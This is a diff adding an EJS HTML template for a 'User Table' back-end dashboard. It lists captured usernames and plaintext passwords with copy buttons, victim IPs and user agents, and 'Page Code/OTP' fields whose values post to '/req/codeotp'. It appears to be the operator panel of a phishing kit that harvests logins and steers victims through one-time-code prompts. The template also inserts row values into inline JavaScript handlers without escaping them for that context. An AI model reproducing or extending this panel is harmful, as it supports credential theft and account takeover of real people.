@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html><head>
+  <meta charset="UTF-8">
+
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Table</title>
+  <style>
+      td {
+            width: auto; /* Ensures the width of the cell adapts to its content */
+        }
+    /* CSS to define row colors based on the 'add' property */
+    .highlighted {
+      background-color: yellow;
+    }
+    
+    .clicked{
+
+      background-color: red;
+    }
+
+      /* Style to ensure text and button appear inline */
+      .inline-button-container {
+            display: flex;
+            justify-content: space-between; /* Ensures text is on the left and button on the right */
+            align-items: center;
+        }
+
+        .inline-button-container button {
+            margin-right: 4px; /* Optional: Add space between text and button */
+            transition: background-color 0.3s; /* Smooth transition for background color */
+        }
+        button{
+          cursor: pointer;
+        }
+      
+  </style>
+
+<script>
+  // JavaScript function to copy text to clipboard
+  function copyToClipboard(event, text) {
+
+
+      // Prevent the default button action (form submission)
+       event.preventDefault();
+
+      // Create a temporary textarea element
+      const tempTextArea = document.createElement("textarea");
+      // Set the value to the text we want to copy
+      tempTextArea.value = text;
+      // Append the textarea to the document body
+      document.body.appendChild(tempTextArea);
+      // Select the text in the textarea
+      tempTextArea.select();
+      // Execute the copy command
+      document.execCommand("copy");
+      // Remove the textarea from the document
+      document.body.removeChild(tempTextArea);
+      // Optional: Notify the user
+      //alert("Copied to clipboard: " + text);
+  }
+</script>
+  
+
+</head>
+<body>
+  <a href="/backend">Home</a><br><br>
+    <h1>User Table</h1>
+    <div>
+      <table id = "myTable" border="2">
+        
+            <tr>
+                <th>ID</th>
+                <th>Username</th>
+                <th>Password</th>
+                <th>Ip</th>
+                <th>Useragent</th>
+                <th>Date</th>
+                <th>Page Code/OTP</th>
+                <th>Mobile Name/CODE</th>
+                <th>Notify</th>
+                <th>Action</th>
+                <th>Notify</th>
+            
+            </tr>
+        
+            <% rows.forEach((row, index) => { %>
+              <tr <% if (row.notify == '0') { %> class="highlighted"<% } %>
+                <% if (row.notify == '2') { %> class="clicked" <% } %>
+                >
+                <form name="form" action='/req/codeotp' method='POST'>
+                <td><%= index + 1 %></td>
+                <td> <div class="inline-button-container"><%= row.username %>&nbsp;&nbsp;<button onclick="copyToClipboard(event, '<%= row.username %>')">Copy</button><input type="hidden" name="username" readonly="" value="<%= row.username %>"></div></td>
+                <td> <div class="inline-button-container"><%= row.password %>&nbsp;&nbsp;<button onclick="copyToClipboard(event, '<%= row.password %>')">Copy</button></div></td>
+                <td><%= row.ip %></td>
+                <td><%= row.useragent %></td>
+                <td><%= row.date %></td>
+                <td><input type="text" name="page"  value="<%= row.pagetype %>"></td>
+                <td><input type="text" name="mobile"  value="<%= row.mobiletype %>"></td>
+                <td><%= row.notify %></td>
+                <td><input type="submit" name="update" value="Update"></td>
+                <td><input type="submit" name="done" value="Done"></td>
+                </form>
+              </tr>
+            <% }); %>
+        
+        
+    </table>
+</div>
+
+  
+   
+</body>
+</html>
